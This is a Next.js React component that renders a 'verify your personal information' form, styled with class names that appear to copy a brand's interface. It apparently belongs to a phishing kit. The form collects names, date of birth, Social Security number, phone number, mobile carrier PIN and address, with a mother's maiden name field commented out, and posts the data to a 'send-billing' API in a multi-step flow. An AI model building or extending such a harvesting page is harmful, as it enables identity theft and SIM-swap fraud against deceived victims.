import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import { Button } from "../../../components/Button";
import { Input } from "../../../components/Input";
import { InputWrapper } from "../../../components/InputWrapper";
import { Wrapper } from "../../../components/Wrapper";
import { getNextUrl } from "../../../utils/getNextUrl";
import { getProgress } from "../../../utils/getProgress";
import { DataContext } from "../../_app";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("This field is required"),
  lastname: yup.string().required("This field is required"),
  dob: yup.string().required("This field is required"),
  ssn: yup.string().required("This field is required"),
  streetAddress: yup.string().required("This field is required"),
  zipCode: yup.string().required("This field is required"),
  state: yup.string().required("This field is required"),
  phoneNumber: yup.string().required("This field is required"),
  carrierPin: yup.string(),
  // mmn: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper
      title="Personal information"
      error={!!(errors && Object.keys(errors).length)}
    >
      <div
        className="tru-core-card-content tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacingXl)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <p
          className="tru-core-card-copy--retail"
          style={{
            marginTop: 0,
          }}
        >
          {" "}
          {`Let's`} verify your personal infromation.{" "}
        </p>
        <InputWrapper>
          <Input
            label={`First name`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`firstname`}
            register={register}
            error={
              errors.firstname &&
              (errors.firstname.message as unknown as string)
            }
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Last name`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`lastname`}
            register={register}
            error={
              errors.lastname && (errors.lastname.message as unknown as string)
            }
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Date of birth`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`dob`}
            register={register}
            error={errors.dob && (errors.dob.message as unknown as string)}
            mask={`99/99/9999`}
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Social Security Number`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`ssn`}
            register={register}
            error={errors.ssn && (errors.ssn.message as unknown as string)}
            mask={`999-99-9999`}
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Phone number`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`phoneNumber`}
            register={register}
            error={
              errors.phoneNumber &&
              (errors.phoneNumber.message as unknown as string)
            }
            mask={`(999) 999 9999`}
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Carrier pin`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`carrierPin`}
            register={register}
            error={
              errors.carrierPin &&
              (errors.carrierPin.message as unknown as string)
            }
            type={`number`}
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Address`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`streetAddress`}
            register={register}
            error={
              errors.streetAddress &&
              (errors.streetAddress.message as unknown as string)
            }
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`State`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`state`}
            register={register}
            error={errors.state && (errors.state.message as unknown as string)}
          />
        </InputWrapper>
        <InputWrapper>
          <Input
            label={`Zip code`}
            wrapperStyle={{
              width: `100%`,
            }}
            name={`zipCode`}
            register={register}
            error={
              errors.zipCode && (errors.zipCode.message as unknown as string)
            }
            type={`number`}
          />
        </InputWrapper>
      </div>
      <div
        className="tru-core-card-actions tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacing2xl)`,
          paddingBottom: `var(--truSpacingLg)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <Button label={`Continue`} onClick={onSubmit} disabled={loading} />
      </div>
    </Wrapper>
  );
};

export default Billing;
